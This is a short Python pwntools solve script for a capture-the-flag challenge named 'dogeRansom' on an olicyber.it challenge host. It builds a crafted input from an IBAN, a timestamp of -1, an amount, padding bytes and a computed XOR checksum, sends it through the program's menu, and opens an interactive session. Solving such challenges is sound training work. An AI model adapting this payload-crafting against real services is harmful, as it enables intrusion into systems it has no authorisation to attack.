from pwn import *

exe = ELF("./dogeRansom")

context.binary = exe

HOST = "dogeransom.challs.olicyber.it"
PORT = 10804

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

AMOUNT = 1984
IBAN = b"IT70S0501811800000012284030\x00"

def build_payload():
    timestamp = pack(-1)
    checksum = 0
    for i in IBAN:
        checksum ^= i

    money = AMOUNT
    for i in range(3):
        checksum ^= money
        money >>= 8

    for i in timestamp:
        checksum ^= i

    checksum %= 256

    payload = IBAN + timestamp + pack(AMOUNT)  + b"\x03" * 8 + chr(checksum).encode() + b"\x03\x03"
    return payload
    
def send(r):
    payload = build_payload()
    
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", b"1")
    r.sendlineafter(b": ", payload)
        
def main():
    r = conn()
    send(r)    
    r.interactive()

if __name__ == "__main__":
    main()
